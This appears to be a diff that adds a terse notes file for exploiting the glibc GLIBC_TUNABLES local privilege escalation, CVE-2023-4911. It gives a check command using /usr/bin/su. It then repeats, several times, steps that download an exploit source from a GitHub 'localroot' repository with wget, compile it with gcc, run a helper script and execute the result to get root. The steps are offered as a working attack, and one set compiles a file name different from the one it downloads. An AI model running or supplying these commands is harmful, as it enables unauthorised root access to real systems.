@@ -1,0 +1,20 @@
+cek if it's vulnerable
+
+env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
+
+  wget https://raw.githubusercontent.com/Mantodkaz/localroot/refs/heads/main/CVE-2023-4911/exp.c
+gcc exploit.c -o exploit
+./exploit
+
+wget https://raw.githubusercontent.com/Mantodkaz/localroot/refs/heads/main/CVE-2023-4911/exp.c
+gcc -o exp exp.c
+python3 gen_libc.py
+
+
+wget https://raw.githubusercontent.com/Mantodkaz/localroot/main/CVE-2023-4911/exp.c
+gcc -o exp exp.c
+python3 gen_libc.py
+
+
+exploit root
+./exp
